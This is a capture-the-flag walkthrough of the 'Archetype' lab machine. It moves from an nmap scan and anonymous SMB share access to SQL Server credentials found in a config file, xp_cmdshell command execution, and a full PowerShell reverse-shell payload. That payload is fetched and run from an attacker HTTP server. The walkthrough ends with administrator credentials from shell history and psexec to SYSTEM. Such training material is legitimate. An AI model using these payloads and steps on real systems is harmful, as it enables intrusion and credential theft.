## -------->> Archetype <<--------

###### // We will start with nmap scan on all ports

$ nmap -sV -A -Pn 10.10.10.27 -p-

	Nmap scan report for 10.10.10.27
	Host is up (0.26s latency).
	Not shown: 65523 closed ports
	PORT      STATE SERVICE      VERSION
	135/tcp   open  msrpc        Microsoft Windows RPC
	139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
	1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
	| ms-sql-ntlm-info: 
	|   Target_Name: ARCHETYPE
	|   NetBIOS_Domain_Name: ARCHETYPE
	|   NetBIOS_Computer_Name: ARCHETYPE
	|   DNS_Domain_Name: Archetype
	|   DNS_Computer_Name: Archetype
	|_  Product_Version: 10.0.17763
	| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
	| Not valid before: 2021-06-09T04:29:24
	|_Not valid after:  2051-06-09T04:29:24
	|_ssl-date: 2021-06-09T05:08:13+00:00; +18m19s from scanner time.
	5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
	|_http-server-header: Microsoft-HTTPAPI/2.0
	|_http-title: Not Found
	49664/tcp open  msrpc        Microsoft Windows RPC
	49665/tcp open  msrpc        Microsoft Windows RPC
	49666/tcp open  msrpc        Microsoft Windows RPC
	49667/tcp open  msrpc        Microsoft Windows RPC
	49668/tcp open  msrpc        Microsoft Windows RPC
	49669/tcp open  msrpc        Microsoft Windows RPC
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

	Host script results:
	|_clock-skew: mean: 1h42m19s, deviation: 3h07m51s, median: 18m18s
	| ms-sql-info: 
	|   10.10.10.27:1433: 
	|     Version: 
	|       name: Microsoft SQL Server 2017 RTM
	|       number: 14.00.1000.00
	|       Product: Microsoft SQL Server 2017
	|       Service pack level: RTM
	|       Post-SP patches applied: false
	|_    TCP port: 1433
	| smb-os-discovery: 
	|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
	|   Computer name: Archetype
	|   NetBIOS computer name: ARCHETYPE\x00
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2021-06-08T22:08:02-07:00
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb2-security-mode: 
	|   2.02: 
	|_    Message signing enabled but not required
	| smb2-time: 
	|   date: 2021-06-09T05:08:00
	|_  start_date: N/A


// We can see there is smb service open (usually ports 139 and 445)
// When there is a smb service open usually the anonymous connection allowed by default
// we can check that with 'smbclient' command

$ smbclient -N -L \\\\10.10.10.27\\

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available

// we can see shared directory called backups 
// inside backups directory there is a file called prod.dtsConfig 

$ smbclient -N \\\\10.10.10.27\\backups
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 12:20:57 2020
  ..                                  D        0  Mon Jan 20 12:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 12:23:02 2020

		10328063 blocks of size 4096. 8254480 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)

// lets grab him

smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)

// and see the content

$ cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>

// Its seems we have some credentials

Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1

// Since we know from nmap there is ms-sql service running
| ms-sql-info: 
|   10.10.10.27:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

// Its probably the ms-sql user credentials
// lets try connect with Impacket's tool called 'mssqlclient.py' with -windows-auth 
// since we know the host is windows from nmap (OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3))
// and we have credentials

$ cp /usr/share/doc/python3-impacket/examples/mssqlclient.py mssqlclient.py

$ ls
archetype.txt  mssqlclient.py  prod.dtsConfig

$ python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 

// lets dig inside the DataBase
// First we will check if our current ms-sql user member in 'sysadmin' role (1 means True)

SQL> SELECT IS_SRVROLEMEMBER ('sysadmin')
              

-----------   

          1 
          
// Now we will want to enable to display all the avalible options configured at instance level in SQL.
// the command will allow any user to have access to sp_configure command and will expose-
// advanced configurtatiom parameters to an untrusted user.

SQL> EXEC sp_configure 'Show Advanced Options', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.

// sql need refresh to configuration by command 'reconfigure;'

SQL> reconfigure;

// now we will see the options of 'sp_configure'

SQL> sp_configure;
name                                      minimum       maximum   config_value     run_value   

-----------------------------------   -----------   -----------   ------------   -----------   

...

two digit year cutoff                        1753          9999           2049          2049   

user connections                                0         32767              0             0   

user options                                    0         32767              0             0   

xp_cmdshell                                     0             1              1             1 


// we can see in the end that we can use 'xp_cmdshell' lets try this

SQL> xp_cmdshell "whoami"
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL   

// Awesome! we can intercat with Host
// We will use powershell to download powershell(.ps1) payload
// First we will make the payload file, i have found great reverse powershell script in https://www.revshells.com/

$ cat shell.ps1 
$client = New-Object System.Net.Sockets.TCPClient("10.10.16.7",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

// Now will we open http server using python for upload the file

$ sudo python3 -m http.server 1444
Serving HTTP on 0.0.0.0 port 1444 (http://0.0.0.0:1444/) ...

// And open a listiner on port 443

$ sudo rlwrap nc -lvnp 443
listening on [any] 443 ...

// Now when all set we can transfer the shell.ps1 payload to targeted machine and execute

SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.7:1444/shell.ps1\");"

// We have a shell !!!

$ sudo rlwrap nc -lvnp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.27] 49687

# whoami
archetype\sql_svc

// we have the user flag !

# type user.txt
3e7b1..............

------------------------------Privileges Escalation---------------------------------------

//// Privileges Escalation
// digging in our user(sql_svc), didnt find much 
// and try 'dir /a' (show hidden) didnt work 
// entering powershell by writhing 'powershell' command

# powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\sql_svc> 

// using 'dir -Force'(powershell command) to show all hidden

# dir -Force


    Directory: C:\Users\sql_svc


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        1/20/2020   5:01 AM                3D Objects                                                            
d--h--        9/15/2018  12:12 AM                AppData                                                               
d--hsl        1/19/2020   3:10 PM                Application Data                                                      
d-r---        1/20/2020   5:01 AM                Contacts                                                              
d--hsl        1/19/2020   3:10 PM                Cookies                                                               
d-r---        1/20/2020   5:42 AM                Desktop                                                               
d-r---        1/20/2020   5:01 AM                Documents                                                             
d-r---        1/20/2020   5:01 AM                Downloads                                                             
d-r---        1/20/2020   5:01 AM                Favorites                                                             
d-r---        1/20/2020   5:01 AM                Links                                                                 
d--hsl        1/19/2020   3:10 PM                Local Settings                                                        
d-r---        1/20/2020   5:01 AM                Music                                                                 
d--hsl        1/19/2020   3:10 PM                My Documents                                                          
d--hsl        1/19/2020   3:10 PM                NetHood                                                               
d-r---        1/20/2020   5:01 AM                Pictures                                                              
d--hsl        1/19/2020   3:10 PM                Recent                                                                
d-r---        1/20/2020   5:01 AM                Saved Games                                                           
d-r---        1/20/2020   5:01 AM                Searches                                                              
d--hsl        1/19/2020   3:10 PM                SendTo                                                                
d--hsl        1/19/2020   3:10 PM                Start Menu                                                            
d--hsl        1/19/2020   3:10 PM                Templates                                                             
d-r---        1/20/2020   5:01 AM                Videos                                                                
-a-h--        3/20/2020   6:11 AM         131072 NTUSER.DAT                                                            
-a-hs-        1/19/2020   3:10 PM         118784 ntuser.dat.LOG1                                                       
-a-hs-        1/19/2020   3:10 PM          32768 ntuser.dat.LOG2                                                       
-a-hs-        1/19/2020   3:10 PM          65536 NTUSER.DAT{9a46ae7e-3b4f-11ea-84f6-005056b44214}.TM.blf               
-a-hs-        1/19/2020   3:10 PM         524288 NTUSER.DAT{9a46ae7e-3b4f-11ea-84f6-005056b44214}.TMContainer0000000000
                                                 0000000001.regtrans-ms                                                
-a-hs-        1/19/2020   3:10 PM         524288 NTUSER.DAT{9a46ae7e-3b4f-11ea-84f6-005056b44214}.TMContainer0000000000
                                                 0000000002.regtrans-ms                                                
---hs-        1/19/2020   3:10 PM             20 ntuser.ini                                                            


// continued digging we found file called 'ConsoleHost_history.txt'
// in '\Users\sql_svc\AppData\Roaming\Microsoft\windows\PowerShell\PSReadline'

# pwd

Path                                                                    
----                                                                    
C:\Users\sql_svc\AppData\Roaming\Microsoft\windows\PowerShell\PSReadline


# cat ConsoleHost_history.txt 
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!


// the file contains administrator credentials !!!
// for admin shell we can use another Impacket's tool called psexec.py 
// that is a telnet-replacement that lets you execute processes on remote system
// connection conditions are that shell will spawn for specified user only if 'ADMIN$' and 'C$' shares are writable.

$ cp /usr/share/doc/python3-impacket/examples/psexec.py psexec.py

$ python3 psexec.py administrator@10.10.10.27
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file AnxLzRaQ.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service Lfzs on 10.10.10.27.....
[*] Starting service Lfzs.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

// we have Administrator flag !

C:\Users\Administrator\Desktop>type root.txt
b91cce.................



